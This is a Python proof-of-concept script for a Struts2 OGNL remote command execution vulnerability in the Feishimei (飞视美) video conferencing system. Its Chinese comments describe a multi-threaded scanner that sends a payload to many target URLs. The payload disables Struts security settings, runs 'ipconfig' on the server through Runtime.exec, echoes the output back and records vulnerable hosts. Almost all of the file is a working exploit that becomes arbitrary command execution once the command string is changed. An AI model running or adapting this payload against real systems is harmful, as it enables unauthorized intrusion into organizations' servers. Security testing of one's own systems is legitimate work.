# 飞视美 视频会议系统 Struts2 远程命令执行漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                    author:watermelon_xz🍉
                                        version:飞视美 视频会议系统 Struts2 远程命令执行漏洞 
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="飞视美 视频会议系统 Struts2 远程命令执行漏洞 ")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/confinfoaction!showallConfinfos.action'
    url = target+payload
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'Connection':'close',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'
         }
    data = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'ipconfig\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re.text)
        if re.status_code == 200 and "Ethernet" in re.text:
            # print("200啦")
            print(f'[+++]该{target}存在飞视美 视频会议系统 Struts2 远程命令执行漏洞 ')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
            return True
        else:
            print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()